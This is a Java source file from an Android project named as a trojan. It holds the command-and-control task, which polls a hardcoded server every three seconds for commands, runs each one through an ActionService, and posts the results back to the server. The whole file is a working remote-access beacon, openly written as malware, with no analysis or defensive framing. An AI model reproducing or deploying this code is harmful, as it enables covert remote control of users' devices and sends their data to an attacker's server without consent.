package trojan.android.android_trojan.AsyncTask;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import trojan.android.android_trojan.ActionService;
import trojan.android.android_trojan.Tools;

/**
 * Created by hoodlums on 14/01/15.
 */
public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
    private static final String TAG = "ConnectionServerTask";
    private HttpClient httpClient;
    private ActionService actionService;
    private String address="10.10.160.37";
    private String port="8080";
    private String urlaction = "http://"+address+":"+port+"/action";
    private String urlresult = "http://"+address+":"+port+"/result";
    private Context context;
    private int time = 3000;

    public ConnectionServerTask(Context context){
        this.context = context;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        Log.d(TAG, "onPreExecute");

        actionService = new ActionService(context);
        httpClient = new DefaultHttpClient();
    }

    @Override
    protected Void doInBackground(Void... voids) {
    String result;
        while (!isCancelled()){
            Log.i(TAG, "doInBackground");
            result = getHttp(urlaction);

            if(result != null && !result.equals("null")){
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
                nameValuePairs.add(new BasicNameValuePair("result", actionService.action(result)));

                postHttp(urlresult, nameValuePairs);
            }
            Tools.sleep(time);
        }

        return null;
    }

    @Override
    protected void onPostExecute(Void aVoid) {
        super.onPostExecute(aVoid);
        Log.d(TAG, "onPostExecute");
    }

    private String convertInputStreamToString(InputStream inputStream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;
    }

    private String getHttp(String url){
        Log.d(TAG, "getHttp");
        InputStream inputStream = null;
        String result = "";

        try{
            HttpResponse httpResponse = httpClient.execute(new HttpGet(url));
            inputStream = httpResponse.getEntity().getContent();
            result = convertInputStreamToString(inputStream);
            return result;
        } catch (Exception e) {
            Log.d(TAG, "GET " + e.getLocalizedMessage());
            return null;
        }
    }

    private String postHttp(String url, List<NameValuePair> nameValuePairs){
        Log.d(TAG, "postHttp");
        InputStream inputStream = null;
        String result = "";

        try{
            HttpPost httppost = new HttpPost(url);

            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse httpResponse = httpClient.execute(httppost);
            inputStream = httpResponse.getEntity().getContent();

            result = convertInputStreamToString(inputStream);
            return result;
        } catch (Exception e) {
            Log.d(TAG, "POST " + e.getLocalizedMessage());
            return null;
        }
    }
}
